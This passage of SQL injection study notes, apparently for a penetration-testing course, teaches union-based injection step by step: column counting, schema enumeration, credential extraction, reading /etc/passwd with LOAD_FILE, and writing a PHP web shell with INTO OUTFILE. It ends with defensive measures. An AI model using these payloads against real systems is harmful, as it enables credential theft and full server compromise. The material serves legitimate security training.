    | ZZ-21     | Shenzhen  |
    ```
    - Combines 3 rows from `ports` and 1 from `ships` into 4 rows.

## Even Columns
- **Requirement**: `UNION` requires equal column counts in all `SELECT` statements.
- **Error Example**:
  ```sql
  SELECT city FROM ports UNION SELECT * FROM ships;
  ```
  - Error: `ERROR 1222 (21000): The used SELECT statements have a different number`
    - `ports` returns 1 column (`city`), `ships` returns 2 (`ship`, `city`).
- **Solution**: Ensure both `SELECT` statements return the same number of columns.

## Un-even Columns
- **Challenge**: Original query and injected query may have different column counts.
- **Solution**: Use junk data (e.g., strings, numbers, or `NULL`) to match the column count of the original query.
- **Example**:
  - Original Query (2 columns in `products`):
    ```sql
    SELECT * FROM products WHERE product_id='user_input'
    ```
  - Injection:
    ```sql
    SELECT * FROM products WHERE product_id='1' UNION SELECT username, 2 FROM passwords
    ```
    - Injects `username` from `passwords`, uses `2` as junk data for the second column.
- **Advanced Case** (4 columns in `products`):
  ```sql
  UNION SELECT username, 2, 3, 4 FROM passwords --
  ```
  - Uses `2, 3, 4` as junk data to match 4 columns.
  - `--` comments out any trailing query parts.
- **Output Example**:
  ```sql
  SELECT * FROM products WHERE product_id UNION SELECT username, 2 FROM passwords
  ```
  - Output:
    ```
    | product_1 | product_2 | product_3 | product_4 |
    | admin     | 2         |           |           |
    ```
    - `admin` (from `username`) appears in the first column, `2` in the second.

## Notes
- **Data Types**: Junk data must match column data types to avoid errors (e.g., use numbers or `NULL` for flexibility).
- **Tip**: `NULL` fits all data types, ideal for advanced injections.
- **Use Case**: Union injection allows dumping data from other tables (e.g., `passwords`) by appending results to the original query’s output.

# Notes on Union Injection in SQL

## Key Concepts

- **Union Injection** is a SQL injection technique that uses the UNION operator to combine the results of the original query with results from an injected query
- This technique works best when you can see the query results on the page

## Steps for Union-Based SQL Injection

### 1. Confirm SQL Injection Vulnerability
- Test with a single quote (`'`) in input fields
- If an error appears, the site is likely vulnerable

### 2. Determine Number of Columns
Two methods to find column count:

#### Method A: ORDER BY
- Inject `' ORDER BY 1-- -` and incrementally increase the number
- Continue until you get an error
- The last successful number equals the column count
- Example: If `' ORDER BY 5-- -` fails but `' ORDER BY 4-- -` works, the table has 4 columns

#### Method B: UNION SELECT
- Try `' UNION SELECT 1,2,3-- -` with increasing numbers of columns
- Continue until you get a successful response
- Example: If `' UNION SELECT 1,2,3,4-- -` works, the table has 4 columns

### 3. Identify Which Columns Are Displayed
- When using the UNION SELECT method with numbers (e.g., `' UNION SELECT 1,2,3,4-- -`)
- Observe which numbers appear in the page output
- These numbers represent displayed columns where you can place exploitable queries
- Example: If you see 2, 3, and 4 on the page, these columns are displayed (while column 1 is not)

### 4. Test Data Extraction
- Replace the number in a displayed column with an actual SQL query
- Example: `' UNION SELECT 1,@@version,3,4-- -` to display the database version
- This confirms you can extract meaningful data from the database

## Important Notes
- Remember to use `-- -` (comment with space) to ignore the rest of the original query
- Not all columns are always displayed to users (e.g., ID fields might be used internally but not shown)
- Place your data extraction queries in columns that are displayed on the page
- This technique works because UNION requires both queries to have the same number of columns

# Database Enumeration in SQL Injection

## MySQL Fingerprinting

### Identifying the DBMS Type
- Initial guess can be based on web server (Apache/Nginx often suggests MySQL, IIS suggests MSSQL)
- Confirm using specific queries:

| Payload | When to Use | Expected Output (MySQL) | Other DBMS |
|---------|-------------|--------------------|------------|
| `SELECT @@version` | Full query output | MySQL version (e.g., 10.3.22-MariaDB) | Different version or error |
| `SELECT POW(1,1)` | Numeric output only | 1 | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | 5-second delay, returns 0 | No delay with other DBMS |

## Database Structure Enumeration

### Using INFORMATION_SCHEMA Database
- INFORMATION_SCHEMA is a special database containing metadata about all databases and tables
- To reference tables in different databases, use the dot operator: `database_name.table_name`

### Step 1: Enumerate Databases
- Query the SCHEMATA table to list all databases
```sql
cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
- Find the current database:
```sql
cn' UNION SELECT 1,database(),2,3-- -
```
- Default MySQL databases (usually ignore these):
  - mysql
  - information_schema
  - performance_schema
  - sys (sometimes)

### Step 2: Enumerate Tables
- Query the TABLES table to find tables in specific databases
```sql
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```
- Use the WHERE clause to filter results for a specific database
- This provides table names (TABLE_NAME) and their database names (TABLE_SCHEMA)

### Step 3: Enumerate Columns
- Query the COLUMNS table to find column names in specific tables
```sql
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```
- This provides column names (COLUMN_NAME) for the specified table

### Step 4: Extract Data
- Once you have database, table, and column names, you can extract the actual data
```sql
cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```
- Remember to use the dot operator to specify the database (e.g., `dev.credentials`)
- Replace the numbers in your UNION SELECT statement with the column names you want to extract

## Important Notes
- Always target specific databases/tables using WHERE clauses to avoid excessive data
- Look for potentially sensitive tables like "credentials," "users," or "admin"
- When working across databases, remember to use the dot notation (database.table)
- Some tables may contain sensitive information like password hashes or API keys

# Reading Files through SQL Injection

## Checking User Privileges

### Identifying Current User
- Determine which database user you're operating as using:
  ```sql
  SELECT USER()
  SELECT CURRENT_USER()
  SELECT user from mysql.user
  ```
- Example payload:
  ```sql
  cn' UNION SELECT 1, user(), 3, 4-- -
  ```

### Checking User Privileges
- Test for superuser privileges:
  ```sql
  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
  ```
  - 'Y' indicates superuser (YES)

- Enumerate all privileges:
  ```sql
  cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
  ```

- **Key privilege for file operations**: `FILE` privilege
  - Required to read files from the server filesystem
  - Usually restricted to privileged users (like DBAs)
  - Modern DBMSs are more restrictive with this privilege

## Reading Files with LOAD_FILE()

### Using LOAD_FILE() Function
- Syntax: `LOAD_FILE('/path/to/file')`
- Example to read system files:
  ```sql
  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
  ```

### Important Considerations
- Success depends on several factors:
  1. The DB user must have FILE privilege
  2. The OS user running the database must have read permissions on the target file
  3. The full path to the file must be specified

### Practical Applications
- Reading sensitive system files (like `/etc/passwd`)
- Accessing application source code:
  ```sql
  cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
  ```
  - Can reveal database credentials within source code
  - Can expose application logic and additional vulnerabilities
  - View page source (Ctrl+U) when HTML is rendered in browser

## Security Implications
- File read capability can lead to exposure of:
  - Configuration files containing credentials
  - Application source code
  - System information
  - Private user data
  - Other sensitive information stored on the server

## Defensive Measures
- DBAs should:
  - Restrict FILE privileges to only necessary users
  - Run database services with minimal OS permissions
  - Implement web application firewalls
  - Use parameterized queries to prevent SQL injection

# Writing Files through SQL Injection

## Prerequisites for File Writing

For MySQL/MariaDB file writing, three conditions must be met:
1. **User must have FILE privilege** enabled
2. **secure_file_priv variable must allow writing** (not be NULL)
3. **OS permissions** must allow writing to the target location

## Checking secure_file_priv Setting

### What is secure_file_priv?
- Controls where MySQL can read/write files
- Possible values:
  - **Empty string**: Can read/write anywhere in filesystem
  - **Directory path**: Can only read/write in that specific directory
  - **NULL**: Cannot read/write files anywhere (most restrictive)

### How to check secure_file_priv:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

- Default settings vary:
  - MariaDB: Empty by default (permissive)
  - MySQL: '/var/lib/mysql-files' by default (restrictive)
  - Modern configurations: Often NULL (most restrictive)

## Writing Files with SELECT INTO OUTFILE

### Basic Syntax
```sql
SELECT data INTO OUTFILE '/path/to/file'
```

### Examples

1. **Exporting table data to file**:
```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials'
```

2. **Writing simple text to file**:
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt'
```

3. **Writing file through SQL injection**:
```sql
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

4. **For cleaner output** (without numbers):
```sql
cn' UNION SELECT "",'content here',"","" INTO OUTFILE '/var/www/html/file.txt'-- -
```

## Writing a Web Shell

### Simple PHP Web Shell
```sql
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Executing Commands
- Access the shell via browser: `http://SERVER_IP:PORT/shell.php?0=id`
- Send commands via the `0` parameter

## Important Considerations

### Finding the Web Root
Options to locate web root directory:
- Read server configuration files:
  - Apache: `/etc/apache2/apache2.conf`
  - Nginx: `/etc/nginx/nginx.conf`
  - IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
- Use fuzzing to try different common paths
- Look for paths revealed in server error messages

### Advanced Techniques
- For writing binary or complex data, use `FROM_BASE64()`:
```sql
SELECT FROM_BASE64('base64_encoded_data') INTO OUTFILE '/path/to/file'
```

### Security Implications
- File writing capability can lead to:
  - Web shell placement
  - Remote code execution
  - Complete server compromise
  - Modification of existing files

## Defensive Measures
- Set `secure_file_priv` to NULL or specific directory
- Limit FILE privilege to essential users only
- Run database with minimum required OS permissions
- Implement proper input validation
- Use parameterized queries to prevent SQL injection

